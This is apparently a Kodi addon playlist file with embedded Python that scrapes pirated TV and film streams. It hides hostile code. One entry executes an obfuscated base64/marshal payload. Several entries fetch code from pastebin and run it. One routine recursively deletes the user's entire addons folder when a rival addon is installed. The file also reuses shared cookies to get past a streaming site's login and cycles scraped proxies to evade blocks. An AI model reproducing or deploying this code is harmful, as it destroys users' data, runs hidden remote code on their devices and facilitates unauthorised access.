TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>













<item>
<title>[COLOR lightgreen][COLOR white]Ultima proxy prueba  Py3[/COLOR]</title>
<link>$doregex[id3]</link>
<regex>
<name>prueba_proxi</name>
<expres><![CDATA[#$pyFunction
url = 'https://adictosalatele.com/TV/espana/canal-0-plus/'
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Referer': 'http://cdn.sportcast.life/webplayer.php?t=ifr&c=1574935&lang=en&eid=1049841&lid=1574935&ci=215&si=3'}
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,header=header):

 if not 'http' in url or 'f4m=' in url:
  return url
 else:
  try:
      web_proxy_1 = requests.get('https://api.proxyscrape.com/?request=displayproxies', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cricfree.stream/home'}, verify=False).text
      web_proxy_1 = six.ensure_str(web_proxy_1)
      web_proxy1 = re.findall('(\d+.*?:\d+)', web_proxy_1)
  except:
      web_proxy1 = ""
  try:
      web_proxy_2 = requests.get('https://api.chrxw.com/proxy/get_all', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cricfree.stream/home'}, verify=False).text
      web_proxy_2 = six.ensure_str(web_proxy_2)
      web_proxy2 = re.findall('(\d+.*?:\d+)', web_proxy_2)
  except:
      web_proxy2 = ""
  try:
      fecha_final = datetime.today().strftime("20%y%m%d")
      dias = str(datetime.fromtimestamp(time.mktime(time.strptime(fecha_final, "%Y%m%d"))) + timedelta(days=-1))
      fecha_nueva = 'https://proxysource.org/en/freeproxies/' + dias[:10]
      proxy_source_response = requests.get(fecha_nueva, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
      proxy_source_response = six.ensure_str(proxy_source_response)
      proxy_source_items = re.findall('[,\[]"(\d+.*?:\d+)"', proxy_source_response)
      web_proxy_source = []
      for item in proxy_source_items:
          if item not in web_proxy_source:
              web_proxy_source.append(item)
  except:
      web_proxy_source = ""
  try:
      web_hidemi_response = requests.get('https://hidemy.name/es/proxy-list/?maxtime=1000&type=h#list', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
      web_hidemi_response = six.ensure_str(web_hidemi_response)
      web_hidemi_items = re.findall('</td></tr><tr><td>(.*?)<.*?(\d+)</td><td><i', web_hidemi_response)
      web_hidemi = []
      for item in web_hidemi_items:
          proxy_integrado = item[0] + ':' + item[1]
          web_hidemi += [proxy_integrado]
  except:
      web_hidemi = ""
  try:
      response = requests.get('https://proxyranker.com/japan#', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
      response = six.ensure_str(response)
      japon_items = re.findall('<tr><td>(.*?)<.*?port">(.*?)<', response)
      web_japon = []
      for item in japon_items:
          proxy_integrado = item[0] + ':' + item[1]
          web_japon += [proxy_integrado]
  except:
      web_japon = ""
  try:
      web_proxy_nuestra_1 = requests.get('https://pastebin.com/raw/Wa13VCMA', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cricfree.stream/home'}, verify=False).text
      web_proxy_nuestra_1 = six.ensure_str(web_proxy_nuestra_1)
      web_proxy_nuestra = re.findall('(\d+.*?:\d+)', web_proxy_nuestra_1)
  except:
      web_proxy_nuestra = ""
  try:
      proxy = web_proxy_nuestra + web_proxy_source + web_hidemi + web_proxy2 + web_proxy1 + web_japon
      Archivo = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
      open(Archivo + 'cambio.txt','wb').write(six.ensure_binary('web_proxy_nuestra='+str(len(web_proxy_nuestra))+'_'+'web_proxy_source='+str(len(web_proxy_source))+'_'+'web_hidemi='+str(len(web_hidemi))+'_'+'web_proxy2='+str(len(web_proxy2))+'_'+'web_proxy1='+str(len(web_proxy1))+'_'+'web_japon='+str(len(web_japon))+'_'))
  except:
      proxy = []
  path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
  try:
      f = open(path, 'r')
      key = f.read()
      f.close()
      full = re.findall('Proxi Utilizado=(.*?)_', key)[0]
      proxy.insert(0, full)
  except:
      pass
  contador = 0
  try:
      html = requests.get(url, headers=header, verify=False).text
      html = six.ensure_str(html)
      try:
          html = re.findall('(Contenido bloqueado|Required! \| Cloudflare|Por causas ajenas a Vodafone|<html><body>Object not found</body></html>)', html)[0]
      except:
          html = html
          proxi = 'No Proxies'
  except:
      html = 'Contenido bloqueado'
  while 'Contenido bloqueado' in html or 'Required! | Cloudflare' in html or 'Por causas ajenas a Vodafone' in html or '<html><body>Object not found</body></html>' == html:
      try:
          xbmc.executebuiltin(("Notification([COLOR white]Usando Proxi %s de %s[/COLOR],[COLOR white]Intentando saltar bloqueo[/COLOR], 5000)")%(contador+1, len(proxy)))
          html = requests.get(url, headers=header, proxies={"https": "http://"+proxy[contador]}, verify=False, timeout=10).text
          html = six.ensure_str(html)
          proxi = proxy[contador]
          try:
              html = re.findall('(Contenido bloqueado|Required! \| Cloudflare|Por causas ajenas a Vodafone|<html><body>Object not found</body></html>)', html)[0]
              contador += 1
          except:
              html = html
              xbmc.executebuiltin(("Notification([COLOR white]Proxi %s[/COLOR],[COLOR white]Logrado saltar bloqueo!![/COLOR], 8000)")%(proxi.replace('1', '3').replace('5', '1').replace('2', '5').replace('3', '7').replace('9', '0')))
      except:
          html = 'Contenido bloqueado'
          contador += 1  
      if len(proxy) == 0:
          xbmc.executebuiltin("Notification([COLOR white]Usa VPN No hemos[/COLOR],[COLOR white]Conseguido Proxies!![/COLOR], 8000)")
          return ''
      elif len(proxy) == contador:
          xbmc.executebuiltin(("Notification([COLOR white]Usa VPN Despues de probar %s[/COLOR],[COLOR white]Proxy No hemos saltado bloqueo!![/COLOR], 8000)")%(contador))
          return ''
  ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
  open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary('Proxi Utilizado='+proxi+'_'+str(contador)+html))
  return url
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>id3</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[prueba_proxi]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six,re,requests
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cLrJIhsDApL

  path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
  f = open(path, 'r')
  html = f.read()
  f.close()
  wigi = re.findall('(?s)iframe.*?src=[\'"]([^\'"]+)', six.ensure_str(html))[0]
  ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
  open(ArchivoDestino + 'wigi.txt','wb').write(six.ensure_binary(wigi))
  html_1 = requests.get(wigi, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': url}, verify=False).text
  html_1 = six.ensure_str(html_1)
  try:
      url2 = re.findall('source.*?[\'"](.*?m3u8.*?)[\'"]', html_1)[0]
  except:
      pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', html_1)[0]
      unpack=jsunpack.unpack(pack)
      url2 = re.findall('Clappr.Player[\w\W]*?(?:source|src):\s*[\'"]([^\'"]+)"', unpack)[0] + '|Referer=' + url
  return url2
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
</item>









<item>
<title>[COLOR lightskyblue]Estable [COLOR orangered]Chikiry_Cristal TV HD[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[A.param1]</title>
<thumbnail>[A.param3]</thumbnail>
<fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
<link>$doregex[busca]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data, Cookie_Jar, m):
    items = [('[COLOR gold]** [/COLOR][COLOR white]INFORMACION IMPORTANTE[COLOR gold] **[/COLOR]', 'informacion', 'https://i.imgur.com/Z2uD47a.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DEPORTES[/COLOR]', 'deportes', 'https://i.imgur.com/ZcG5Wvu.jpg'), ('[COLOR orangered]+ [COLOR white]TV PREMIUM[/COLOR]', 'tvpremium', 'https://i.imgur.com/AhCogTD.jpg'), ('[COLOR orangered]+ [COLOR white]TDT[/COLOR]', 'tdt', 'https://i.imgur.com/Zu3ZtDQ.jpg'), ('[COLOR orangered]+ [COLOR white]TV INFANTIL[/COLOR]', 'infantil', 'https://i.imgur.com/7iGElA4.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DOCUMENTALES[/COLOR]', 'documentales', 'https://i.imgur.com/hzBiiWJ.jpg'), ('[COLOR orangered]+ [COLOR white]TAQUILLAS[/COLOR]', 'taquilla', 'https://i.imgur.com/gfpSeHc.jpg'), ('[COLOR orangered]+ [COLOR white]LATINOS[/COLOR]', 'latino', 'https://i.imgur.com/8nIpSn3.jpg')]
    return items
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>busca</name>
<listrepeat><![CDATA[
<title>[COLOR white][busca.param1][/COLOR]</title>
<link>$doregex[plugin]$doregex[link_inteligente]</link>
<thumbnail>[busca.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,shutil
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m,elegir=elegir):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    past = urllib_request.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/TV/cristal_chikiry_distancia').read()
    past = six.ensure_str(past)
    if 'p' == past[:2:][1:]:
      past = 'https://pastebin.com/raw/' + past[:1] + past[2:]
    elif 'b' == past[:2:][1:]:
      past = 'http://bit.ly/' + past[:1] + past[2:]
    else:
      past = 'https://pastebin.com/raw/' + past
    if 'informacion' == elegir:

      dialog = xbmcgui.Dialog()
	  
      dialog.textviewer('CHIKIRY_CRISTAL TV', '[COLOR gold]El addon es completamente gratuito, no se aceptan donaciones.[/COLOR]\n[COLOR white]Si has pagado por el te han estafado.[/COLOR]\n[COLOR white]Las secciones se actualizan a diario, si un canal no funciona, reportarlo en los grupos [/COLOR]\n[COLOR aqua]https://t.me/consultaschikiry    https://t.me/addonfestaycristal[/COLOR]\n[COLOR white]No exijas, no te enfades, no critiques, recuerda que esto es un hobby que compartimos en nuestro tiempo libre, no un servicio de pago[/COLOR]\n[COLOR aqua]Gracias, y disfruta[/COLOR]')

      return [('El addon es completamente gratuito, no se aceptan donaciones.', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')]
		  
    elif 'deportes' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"DEPORTES".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Deportes', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR none]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]	  

    elif 'tvpremium' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"TVPREMIUM".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]TvPremium', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR none]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'tdt' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"TDT".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Tdt', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'infantil' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"INFANTIL".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Infantil', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'documentales' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"DOCUMENTALES".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Documentales', 'https://i.imgur.com/Z2uD47a.jpg', '', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', 'No Hay mas Resultados...', '[COLOR white]resultados...')]
	  
    elif 'taquilla' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"TAQUILLA".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Taquilla', 'https://i.imgur.com/bg6n3AV.png', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/QBdkMFK.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]

    elif 'latino' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"LATINO".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Latinos', 'https://i.imgur.com/bg6n3AV.png', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/QBdkMFK.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
    else:
      xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
      return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>emitiendo</name>
<expres><![CDATA[(?s)[makelist2.param4].*?ahora">\s*(.*?)<]]></expres>
<page>http://www.formulatv.com/programacion/movistarplus/</page>
</regex>
<regex>
<name>prueba_proxi</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Referer': 'https://www.blogdepelis.tv/'}
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
$doregex[reparar_proxies]
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>reparar_proxies</name>
<expres><![CDATA[#$pyFunction
import requests,six
def GetLSProData(page_data,Cookie_Jar,m):
    #oficial https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/proxieshttps://pastebin.com/raw/GDkjkYh6
    pasta = requests.get('https://pastebin.com/raw/GDkjkYh6', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>link_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[prueba_proxi]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six,re,requests
from resolveurl.plugins.lib import jsunpack
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cLrJIhsDApL
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    if 'adictosalatele' in url:
      path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
      f = open(path, 'r')
      html = f.read()
      f.close()
      iframe = re.findall('(?s)iframe.*?src=[\'"]([^\'"]+)', html)[0]
      html1 = requests.get(iframe, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': url}, verify=False).text
      try:
          url2 = re.findall('source.*?[\'"](.*?m3u8.*?)[\'"]', html1)[0]
      except:
          pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', html1)[0]
          unpack=jsunpack.unpack(pack)
          url2 = re.findall('Clappr.Player[\w\W]*?(?:source|src):\s*[\'"]([^\'"]+)"', unpack)[0] + '|Referer=' + url
      return url2
    elif 'f4m=' in url:
      url = url[4:]
      return '/?' + url
    else:
      return url
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>plugin</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if 'f4m=' in url:
    return 'plugin://plugin.video.f4mTester'
  else:
    return ''
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/Z2uD47a.jpg</thumbnail>  
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
 </item>























<item>
<title>[COLOR gold]*[/COLOR] [COLOR darkgoldenrod]Cine [COLOR bisque]estrenoa cristal[/COLOR]</title>  
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
